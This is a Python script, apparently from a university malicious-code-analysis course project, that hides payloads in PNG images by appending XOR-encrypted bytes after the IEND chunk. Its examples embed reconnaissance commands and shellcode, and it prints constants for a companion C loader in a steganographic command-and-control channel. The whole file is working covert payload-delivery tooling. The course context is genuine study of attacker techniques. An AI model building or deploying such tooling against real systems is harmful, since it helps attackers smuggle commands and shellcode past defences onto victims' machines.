#!/usr/bin/env python3
"""
Payload Embedder - EOF Appending Technique (hide-payload-in-images style)
Appends a payload after the PNG IEND chunk, optionally XOR-encrypted.

This implements the same technique used in:
  - WafflesExploits/hide-payload-in-images
  - Real-world campaigns combining steganography + Adaptix C2

Unlike LSB steganography (encoder.py), this method appends raw bytes AFTER
the image data ends. The image renders normally because PNG readers stop
at the IEND chunk. The hidden data lives beyond it.

CMU Heinz College - 95-759 Malicious Code Analysis
Group Project: Steganography-Based C2 Channel

Usage:
    python payload_embedder.py <input_image> <payload> <output_image> [--xor-key KEY]

Examples:
    # Embed a text command
    python payload_embedder.py images/original.png "whoami" images/embedded_eof.png

    # Embed with XOR encryption (key 0-255)
    python payload_embedder.py images/original.png "net user /domain" images/embedded_eof.png --xor-key 0x4D

    # Embed a binary file (e.g., shellcode .bin)
    python payload_embedder.py images/original.png payload.bin images/embedded_eof.png --file --xor-key 0xAA
"""

import argparse
import os
import struct
import sys


# PNG IEND chunk bytes (always the same: length=0, type=IEND, CRC)
PNG_IEND_MARKER = b'\x00\x00\x00\x00IEND\xaeB`\x82'


def xor_encrypt(data, key):
    """XOR encrypt/decrypt data with a single-byte key."""
    return bytes([b ^ key for b in data])


def find_iend_offset(image_data):
    """Find the byte offset where the PNG IEND chunk ends."""
    pos = image_data.find(PNG_IEND_MARKER)
    if pos == -1:
        return -1
    return pos + len(PNG_IEND_MARKER)


def embed_payload(input_image, payload_bytes, output_image, xor_key=None):
    """Embed payload bytes after the PNG IEND chunk."""

    # Read the original image
    print(f"[*] Loading image: {input_image}")
    with open(input_image, 'rb') as f:
        image_data = f.read()

    original_size = len(image_data)
    print(f"[*] Original image size: {original_size:,} bytes")

    # Verify it's a PNG
    if image_data[:8] != b'\x89PNG\r\n\x1a\n':
        print("[-] ERROR: Input file is not a valid PNG image.")
        sys.exit(1)

    # Find IEND chunk
    iend_offset = find_iend_offset(image_data)
    if iend_offset == -1:
        print("[-] ERROR: Could not find PNG IEND chunk.")
        sys.exit(1)

    print(f"[*] PNG IEND chunk ends at byte offset: {iend_offset}")

    # Check if there's already data after IEND
    if iend_offset < original_size:
        trailing = original_size - iend_offset
        print(f"[!] WARNING: Image already has {trailing} bytes after IEND (will be overwritten)")

    # Prepare payload
    payload_size = len(payload_bytes)
    print(f"[*] Payload size: {payload_size:,} bytes")

    if xor_key is not None:
        print(f"[*] XOR encrypting payload with key: 0x{xor_key:02X} ({xor_key})")
        payload_bytes = xor_encrypt(payload_bytes, xor_key)
        print(f"[*] Encrypted payload size: {len(payload_bytes):,} bytes")

    # Build the embedded image:
    # [original PNG data up to end of IEND] + [4-byte payload size header] + [payload bytes]
    #
    # The 4-byte size header lets the extractor know how many bytes to read.
    # This mirrors real-world implementations where the original file size is
    # hardcoded into the extractor (original_size constant in C loader).
    size_header = struct.pack('<I', payload_size)  # little-endian uint32

    embedded_data = image_data[:iend_offset] + size_header + payload_bytes

    # Write output
    with open(output_image, 'wb') as f:
        f.write(embedded_data)

    final_size = len(embedded_data)
    print()
    print(f"[+] Embedded image saved to: {output_image}")
    print(f"[+] Original PNG data: {iend_offset:,} bytes")
    print(f"[+] Appended data: {len(size_header) + len(payload_bytes):,} bytes (4 header + {payload_size:,} payload)")
    print(f"[+] Total file size: {final_size:,} bytes")
    print(f"[+] Original image size (for C extractor constant): {iend_offset}")

    if xor_key is not None:
        print(f"[+] XOR key (for C extractor constant): 0x{xor_key:02X}")


def main():
    parser = argparse.ArgumentParser(
        description="Payload Embedder - Hide payloads after PNG IEND chunk (hide-payload-in-images technique)",
        epilog='Example: python payload_embedder.py images/original.png "whoami" images/embedded_eof.png --xor-key 0x4D'
    )
    parser.add_argument("input_image", help="Path to the source PNG image")
    parser.add_argument("payload", help="Command string to embed, or path to binary file (with --file)")
    parser.add_argument("output_image", help="Path for the output embedded image")
    parser.add_argument(
        "--xor-key", "-x",
        type=lambda x: int(x, 0),  # supports 0x4D, 77, 0b1001101
        default=None,
        help="Single-byte XOR key for encryption (0-255, e.g., 0x4D or 77)"
    )
    parser.add_argument(
        "--file", "-f",
        action="store_true",
        help="Treat payload argument as a file path to read binary data from"
    )

    args = parser.parse_args()

    # Validate XOR key
    if args.xor_key is not None and not (0 <= args.xor_key <= 255):
        print("[-] ERROR: XOR key must be 0-255")
        sys.exit(1)

    print("=" * 60)
    print("  PAYLOAD EMBEDDER - EOF Append Technique")
    print("  (hide-payload-in-images / Adaptix C2 style)")
    print("=" * 60)
    print()

    # Get payload bytes
    if args.file:
        if not os.path.exists(args.payload):
            print(f"[-] ERROR: Payload file not found: {args.payload}")
            sys.exit(1)
        with open(args.payload, 'rb') as f:
            payload_bytes = f.read()
        print(f"[*] Payload source: file '{args.payload}'")
    else:
        payload_bytes = args.payload.encode('utf-8')
        print(f"[*] Payload source: command string")
        print(f"[*] Command: {args.payload}")

    embed_payload(args.input_image, payload_bytes, args.output_image, args.xor_key)

    print()
    print("=" * 60)


if __name__ == "__main__":
    main()
